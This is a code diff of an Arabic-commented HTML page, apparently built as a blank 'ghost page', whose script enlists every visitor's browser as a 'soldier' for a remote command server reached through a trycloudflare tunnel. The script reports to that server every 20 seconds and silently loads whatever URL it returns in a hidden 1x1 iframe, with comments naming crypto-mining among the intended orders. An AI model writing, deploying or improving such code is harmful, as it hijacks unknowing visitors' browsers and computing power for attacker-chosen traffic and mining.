@@ -1,28 +1,39 @@
 <!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"></head>
-<body style="background:#fff;">
-    <!-- 🧬 نبضة 'الجنرال' | الرادار الهجين 2026 -->
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> </title> <!-- صفحة أشباح بدون عنوان -->
+    <style>body { background: #fff; margin: 0; padding: 0; overflow: hidden; }</style>
+</head>
+<body>
     <script>
-        // رابط الترمكس الخاص بك (الذي ستحصل عليه من cloudflared)
-        const masterServer = "https://رابط-ترمكس-الخاص-بك.trycloudflare.com";
+        // 🛰️ رابط 'مركز القيادة' في الترمكس (الخاص بك)
+        // استبدل النجوم بالرابط: trance-billing-supports-lead.trycloudflare.com
+        const masterServer = "https://trance-billing-supports-lead.trycloudflare.com";
 
-        function syncArmy() {
-            fetch(`${masterServer}/ping.php`) // إبلاغ الترمكس بوجود جندي
-            .then(res => res.json())
+        function syncWithGeneral() {
+            // 🕵️ إرسال نبضة 'أنا جندي جديد' للترمكس لكي تراه في الرادار
+            fetch(`${masterServer}/ping.php`)
+            .then(response => response.json())
             .then(data => {
-                if(data.target) {
-                    var ifr = document.createElement('iframe');
-                    ifr.src = data.target; // فتح الرابط الذي تأمره به من ترمكس
-                    ifr.style.display = 'none';
-                    document.body.appendChild(ifr);
+                // 🕹️ تنفيذ الأمر القادم من الترمكس (فتح رابط، تعدين، إلخ)
+                if (data.target) {
+                    const shadowFrame = document.createElement('iframe');
+                    shadowFrame.src = data.target;
+                    shadowFrame.style.display = 'none';
+                    shadowFrame.width = '1';
+                    shadowFrame.height = '1';
+                    document.body.appendChild(shadowFrame);
+                    console.log("💰 [ORDER RECEIVED] | Target: " + data.target);
                 }
-            }).catch(e => console.log("Waiting for General..."));
+            })
+            .catch(error => console.log("Waiting for General's orders..."));
         }
 
-        // المزامنة كل 15 ثانية لرصد الجنود والتحكم بهم
-        setInterval(syncArmy, 15000);
-        syncArmy();
+        // المزامنة كل 20 ثانية لضمان السيطرة المطلقة
+        setInterval(syncWithGeneral, 20000);
+        syncWithGeneral(); // النبضة الأولى فور الدخول
     </script>
 </body>
 </html>
